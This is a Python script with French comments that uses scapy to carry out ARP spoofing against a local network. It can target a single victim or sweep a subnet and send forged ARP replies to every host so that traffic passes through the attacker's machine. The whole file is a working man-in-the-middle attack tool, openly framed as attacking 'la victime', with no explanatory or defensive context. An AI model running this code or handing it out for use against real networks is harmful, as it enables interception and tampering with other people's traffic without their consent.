# coding=utf-8
#!/usr/bin/python
#----------------------------IMPORTS ------------------------------------------
import signal
import sys
import socket
import os
import time
import argparse


# Nettoyer réseau
def signal_handler(sig, frame):
  global victim_ip
  global routeur_ip
  global victim_mac
  global routeur_mac    
  print('\n [!] Restoration réseau de la victime')
  send(ARP(pdst=victim_ip, macdst=victim_mac, psrc=routeur_ip, macsrc=routeur_mac, op=2), count=5, inter=.2)

  sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

from scapy.all import *
conf.verb = 0


#------------------------- FONCTIONS SPOOFING/SNIFFING ARP ----------------------------

#-----------------------------------UNE VICTIME ---------------------------------------

def single():
  sniff(filter="arp and host "+routeur_ip, prn=arp_sniffing1)


def arp_spoof1():
  ethernet = Ether()
  arp = ARP(pdst=victim_ip, psrc=routeur_ip, op="is-at")
  packet = ethernet / arp
  sendp(packet, iface=iface)
  print("[*]Envoi")


def arp_sniffing1(pkt):
    if pkt[ARP].op == 1:  # is-at (response)
        print('\n\n[i] Réponse : ( {0} ) adresse : ( {1} )'.format(pkt[ARP].hwsrc, pkt[ARP].psrc))
        arp_spoof1()


#------------------------------- ATTAQUE TOUT LE RÉSEAU ---------------------------

def all():
  sniff(filter="arp and host "+routeur_ip, prn=arp_sniffing2)


def arp_spoof2(): #Obtenir toutes les adresses MAC du réseau + les spoofer
  # Création paquet ARP
  arp = ARP(pdst=victim_ip)
  # Créer le paquet Broadcast Ether
  # ff:ff:ff:ff:ff:ff c'est le broadcast (MAC)
  ether = Ether(dst="ff:ff:ff:ff:ff:ff")
  # stack them
  packet = ether/arp
  result = srp(packet, timeout=3, verbose=0)[0]
  # a list of clients, we will fill this in the upcoming loop
  victimes = []
  for sent, received in result:
      # Pour chaque réponse, on ajoute ip et mac à la liste `victimes`
      victimes.append({'ip': received.psrc, 'mac': received.hwsrc})
  # On affiche toutes les victimes du réseaus
  print("\nEQUIPEMENTS CONNECTÉS AU RÉSEAU")
  print("IP" + " "*18+"MAC")
  for x in victimes:
      print("{:16}    {}".format(x['ip'], x['mac']))

  ethernet = Ether()
  for x in victimes:
    if x['ip']==routeur_ip: #On supprime l'adresse IP du routeur car on ne veut pas lui envoyer de packet ARP
      del x['ip']
    else:
      arp = ARP(pdst=x['ip'], psrc=routeur_ip, op="is-at")
      packet = ethernet / arp
      sendp(packet, iface=iface)
      print("[*]Envoi a ( {0} )".format(x['ip']))


def arp_sniffing2(pkt):
  if pkt[ARP].op == 1:  # is-at (response)
        print('\n\n[i] Réponse : ( {0} ) adresse : ( {1} )'.format(pkt[ARP].hwsrc, pkt[ARP].psrc))
        arp_spoof2()


#----------------------------------- MAIN PROGRAM ------------------------------------
print('[*] Début... [*]')


#---------------------------------- ARGUMENTS -------------------------------------
parser = argparse.ArgumentParser()
#a pour all
parser.add_argument('-a', dest='a', action='store_true', help="shows a")

#s pour single
parser.add_argument('-s', dest='s', action='store_true', help="shows s")

args = parser.parse_args()


#Entrée interface
print("Entrez interface :")
iface=input()

# Obtenir notre IP et MAC
me_ip = get_if_addr(iface)
me_mac = get_if_hwaddr(iface)

#Affichage infos sur le hacker (nous-même)
print('\n[i] Mon adresse IP : ( {0} ) et ma mac : ( {1} )'.format(me_ip, me_mac))

#Définition globale du routeur suivant l'interface
routeur_ip=conf.route.route("0.0.0.0")[2]
x = sr1(ARP(pdst=routeur_ip), iface=iface, timeout=2)
routeur_mac = x.hwsrc


#------------------------------------------------------------------------------------------------
#--------------------------------------- MAIN !!! -----------------------------------------------
#------------------------------------------------------------------------------------------------

#Selon les arguments (soit on attaque tout le réseau, soit juste une victime)
#s pour single et a pour all !

#Attaque de tout le réseau!
try:
  if args.a:
    print("Entrez le réseau :")
    victim_ip= input()
    
    print("\n[*] On attaque le réseau %s sur l'interface %s [*]"%(victim_ip, iface))
    print('[i] On attaque le routeur ( {0} ), MAC ( {1} )'.format(routeur_ip, routeur_mac))
    all()

  #Attaque d'une seule victime sur le réseau
  if args.s:
    print("Entrez la victime :")
    victim_ip=input()
    x = sr1(ARP(pdst=victim_ip), iface=iface, timeout=2) #Comme il s'agit d'une seule victime, nous avons besoin de sa MAC (pour la fonction signal_handler)
    victim_mac = x.hwsrc

    print('\n[i] On attaque la victime ( {0} ), MAC ( {1} )'.format(victim_ip, victim_mac))
    print('[i] On attaque le routeur ( {0} ), MAC ( {1} )'.format(routeur_ip, routeur_mac))
    single() 

except:
  print("[!] Fermeture du programme...")
              
      
#Arrêt du programme avec Ctrl+C
